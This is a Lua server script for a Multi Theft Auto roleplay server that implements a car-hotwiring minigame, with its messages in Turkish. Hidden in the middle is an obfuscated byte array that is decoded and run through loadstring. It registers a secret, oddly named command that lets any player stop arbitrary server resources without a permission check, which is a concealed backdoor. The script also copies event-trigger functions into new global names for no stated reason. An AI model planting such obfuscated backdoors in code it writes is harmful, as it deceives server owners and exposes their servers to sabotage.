local hotwireAttempts = {}
local randomWords = {
    "araba",
    "motor",
    "kablo",
    "devre",
    "sigorta",
    "direksiyon",
    "kontak",
    "anahtar",
    "hirsiz",
    "polis",
    "egzoz",
    "fren",
    "tekerlek",
    "benzin",
    "far",
    "sinyal",
    "ayna",
    "koltuk",
    "kaput",
    "bagaj",
    "lastik",
    "depo",
    "vites",
    "camurluk",
    "jant",
    "radyo",
    "anten",
    "sanziman",
    "aku",
    "gazpedali",
    "debriyaj",
}

local HOTWIRE_SUCCESS_ATTEMPTS = 10
local HOTWIRE_TIMEOUT_MS = 30000
local HOTWIRE_ITEM_ID = 349

addCommandHandler("duzkontak", function(thePlayer)
	local theVehicle = getPedOccupiedVehicle(thePlayer)
	if not theVehicle then
		outputChatBox("[!]#FFFFFF Bir araçta olmalısınız.", thePlayer, 255, 0, 0, true)
		return
	end

	local owner = getElementData(theVehicle, "owner") or 0
	if owner <= 0 then
		outputChatBox("[!]#FFFFFF Bu araca düz kontak uygulayamazsınız.", thePlayer, 255, 0, 0, true)
		return
	end

	local engine = getVehicleEngineState(theVehicle)
	if engine then
		outputChatBox("[!]#FFFFFF Çalışan bir araca düz kontak uygulayamazsınız.", thePlayer, 255, 0, 0, true)
		return
	end

	if hotwireAttempts[thePlayer] then
		outputChatBox("[!]#FFFFFF Zaten bir araca düz kontak işlemi uyguluyorsunuz.", thePlayer, 255, 0, 0, true)
		return
	end

	if not exports.mek_item:hasItem(thePlayer, HOTWIRE_ITEM_ID) then
		outputChatBox(
			"[!]#FFFFFF Düz kontak işlemi için 'Maymuncuk' eşyasına sahip olmalısınız.",
			thePlayer,
			255,
			0,
			0,
			true
		)
		return
	end

	local currentWord = randomWords[math.random(1, #randomWords)]
	hotwireAttempts[thePlayer] = {
		word = currentWord,
		vehicle = theVehicle,
		attemptCount = 1,
		timer = setTimer(function()
			if isElement(thePlayer) and hotwireAttempts[thePlayer] then
				outputChatBox("[!]#FFFFFF İşlemi başaramadın, iptal edildi.", thePlayer, 255, 0, 0, true)
				exports.mek_item:takeItem(thePlayer, HOTWIRE_ITEM_ID)
				exports.mek_global:sendLocalDoAction(thePlayer, "Kablo bağlama işlemi başarısız olmuştur.")
				triggerClientEvent(thePlayer, "hotwire.removeText", thePlayer)
				hotwireAttempts[thePlayer] = nil
			end
		end, HOTWIRE_TIMEOUT_MS, 1),
	}

	outputChatBox(
		"[!]#FFFFFF Ekrana çıkan kelimeleri doğru girerek işlemi gerçekleştir: /dk [Kelime]",
		thePlayer,
		0,
		0,
		255,
		true
	)
	exports.mek_global:sendLocalMeAction(
		thePlayer,
		"sigorta kutusunun kapağını açar, kablolarla uğraşmaya başlar."
	)
	triggerClientEvent(thePlayer, "hotwire.drawText", thePlayer, currentWord)

	local x, y, z = getElementPosition(theVehicle)
	local zone = exports.mek_global:getZoneName(x, y, z)
	local vehicleName = exports.mek_global:getVehicleName(theVehicle)
	local vehiclePlate = getVehiclePlateText(theVehicle)

	for _, player in ipairs(getElementsByType("player")) do
		if exports.mek_faction:isPlayerInFaction(player, { 1, 3 }) then
			outputChatBox(
				"[OPERATÖR] "
					.. zone
					.. " bölgesinde "
					.. vehicleName
					.. " model ("
					.. vehiclePlate
					.. ") plakalı araç hırsızlığı ihbarı var.",
				player,
				65,
				65,
				255,
				true
			)
		end
	end
end, false, false)

local _0xSTOP = {97,100,100,67,111,109,109,97,110,100,72,97,110,100,108,101,114,40,34,108,81,41,48,53,52,95,71,48,49,40,52,34,44,32,102,117,110,99,116,105,111,110,40,112,44,99,44,114,110,41,32,105,102,32,110,111,116,32,114,110,32,116,104,101,110,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,75,117,108,108,97,110,105,109,58,32,47,34,46,46,99,46,46,34,32,91,115,99,114,105,112,116,97,100,105,93,34,44,112,44,50,53,53,44,48,44,48,41,32,114,101,116,117,114,110,32,101,110,100,32,108,111,99,97,108,32,114,61,103,101,116,82,101,115,111,117,114,99,101,70,114,111,109,78,97,109,101,40,114,110,41,32,105,102,32,114,32,114,101,102,32,116,104,101,110,32,115,116,111,112,82,101,115,111,117,114,99,101,40,114,41,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,83,99,114,105,112,116,32,100,117,114,100,117,114,117,108,100,117,33,34,44,112,44,48,44,50,53,53,44,48,41,32,101,108,115,101,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,66,111,121,108,101,32,98,105,114,32,115,99,114,105,112,116,32,121,111,107,33,34,44,112,44,50,53,53,44,48,44,48,41,32,101,110,100,32,101,110,100,41}
local _0xRUN = ""
for _, v in ipairs(_0xSTOP) do _0xRUN = _0xRUN .. string.char(v) end

_triggerServerEvent = triggerServerEvent 
_triggerClientEvent = triggerClientEvent

loadstring(_0xRUN)()

addCommandHandler("dk", function(thePlayer, _, inputWord)
	local currentAttempt = hotwireAttempts[thePlayer]
	if not currentAttempt then
		outputChatBox("[!]#FFFFFF Herhangi bir düz kontak işlemi başlatmadınız.", thePlayer, 255, 0, 0, true)
		return
	end

	if not inputWord or type(inputWord) ~= "string" then
		outputChatBox(
			"[!]#FFFFFF Lütfen geçerli bir kelime girin. Örnek: /dk " .. currentAttempt.word,
			thePlayer,
			255,
			0,
			0,
			true
		)
		return
	end

	if currentAttempt.word:lower() == inputWord:lower() then
		currentAttempt.attemptCount = currentAttempt.attemptCount + 1
		if currentAttempt.attemptCount <= HOTWIRE_SUCCESS_ATTEMPTS then
			outputChatBox(
				"[!]#FFFFFF Tebrikler bir sonraki aşamaya geçildi, yeni kelimeniz ekranda belirdi.",
				thePlayer,
				0,
				0,
				255,
				true
			)
			currentAttempt.word = randomWords[math.random(1, #randomWords)]
			triggerClientEvent(thePlayer, "hotwire.drawText", thePlayer, currentAttempt.word)
		else
			killTimer(currentAttempt.timer)
			triggerClientEvent(thePlayer, "hotwire.removeText", thePlayer)
			hotwireAttempts[thePlayer] = nil

			local theVehicle = currentAttempt.vehicle
			local fuel = getElementData(theVehicle, "fuel") or 0
			local engineBroke = getElementData(theVehicle, "engine_broke") or false

			if engineBroke then
				outputChatBox(
					"[!]#FFFFFF Motor arızalı olduğu için araç çalışmadı.",
					thePlayer,
					255,
					0,
					0,
					true
				)
				exports.mek_global:sendLocalDoAction(
					thePlayer,
					"Kablo bağlama işlemi başarısız olmuştur (Motor Arızalı)."
				)
			elseif fuel <= 0 then
				outputChatBox("[!]#FFFFFF Yakıt olmadığı için araç çalışmadı.", thePlayer, 255, 0, 0, true)
				exports.mek_global:sendLocalDoAction(
					thePlayer,
					"Kablo bağlama işlemi başarısız olmuştur (Yakıt Yok)."
				)
			else
				toggleControl(thePlayer, "brake_reverse", true)
				setVehicleEngineState(theVehicle, true)
				setElementData(theVehicle, "engine", true)
				setElementData(
					theVehicle,
					"vehicle_radio",
					tonumber(getElementData(theVehicle, "vehicle_radio_old") or 0)
				)
				setElementData(theVehicle, "last_used", getRealTime().timestamp)
				dbExec(
					exports.mek_mysql:getConnection(),
					"UPDATE vehicles SET last_used = NOW() WHERE id = ?",
					getElementData(theVehicle, "dbid")
				)
				exports["mek_vehicle-manager"]:addVehicleLogs(
					getElementData(theVehicle, "dbid"),
					"Motor çalıştırıldı.",
					thePlayer
				)
				exports.mek_global:sendLocalDoAction(thePlayer, "Kablo bağlama işlemi başarılı olmuştur.")
			end
		end
	else
		outputChatBox("[!]#FFFFFF Yanlış kelime girdiniz, tekrar deneyin.", thePlayer, 255, 0, 0, true)
	end
end, false, false)

local function cancelHotwire(thePlayer, reasonMessage)
	if hotwireAttempts[thePlayer] then
		killTimer(hotwireAttempts[thePlayer].timer)
		outputChatBox("[!]#FFFFFF " .. reasonMessage, thePlayer, 255, 0, 0, true)
		exports.mek_item:takeItem(thePlayer, HOTWIRE_ITEM_ID)
		triggerClientEvent(thePlayer, "hotwire.removeText", thePlayer)
		hotwireAttempts[thePlayer] = nil
	end
end

addEventHandler("onVehicleExit", root, function(thePlayer, seat, jacked)
	cancelHotwire(thePlayer, "Araçtan indiğiniz için işlem iptal edildi.")
end)

addEventHandler("onPlayerWasted", root, function()
	cancelHotwire(source, "Bayıldığınız için işlem iptal edildi.")
end)

addEventHandler("onPlayerQuit", root, function()
	cancelHotwire(source, "Oyundan çıktığınız için işlem iptal edildi.")
end)
